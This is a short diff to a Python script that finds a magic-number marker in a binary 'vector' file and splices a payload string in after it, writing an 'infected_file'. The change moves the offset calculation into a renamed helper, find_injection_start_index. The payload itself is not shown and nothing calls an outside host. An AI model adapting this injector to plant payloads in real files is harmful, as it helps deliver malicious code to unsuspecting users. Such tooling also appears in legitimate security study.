@@ -14,24 +14,29 @@ def main():
         bin_vector_data = vector_file.read()
 
         print("[ ] Searching for magic number...")
-        magic_number_index = find_magic_number_index(bin_vector_data)
+        injection_start_index = find_injection_start_index(bin_vector_data)
 
-        if magic_number_index >=0:
+        if injection_start_index >=0:
             print("[+] Found magic number.")
             with open(path_to_output, 'wb') as infected_file:
                 print("[ ] Injecting payload...")
                 infected_file.write(
                     inject_payload(
                         bin_vector_data,
-                        magic_number_index,
+                        injection_start_index,
                         payload_code))
                 print("[+] Payload written.")
         else:
             print("[-] Magic number not found. Exiting.")
 
-def find_magic_number_index(
+def find_injection_start_index(
         data: bytes) -> int:
-    return data.find(BIN_MAGIC_NUMBER)
+    index =  data.find(BIN_MAGIC_NUMBER)
+
+    if index >= 0:
+        index += len(BIN_MAGIC_NUMBER)
+
+    return index
 
 def inject_payload(
         vector: bytes,
@@ -39,8 +44,8 @@ def inject_payload(
         payload: str) -> bytes:
     bin_payload = bytes(payload, 'utf-8')
 
-    pre_payload = vector[:index + len(BIN_MAGIC_NUMBER)]
-    post_payload = vector[index + len(BIN_MAGIC_NUMBER) + len(bin_payload):]
+    pre_payload = vector[:index]
+    post_payload = vector[index + len(bin_payload):]
 
     return (pre_payload + bin_payload + post_payload + bytes('\n', 'utf-8'))
 
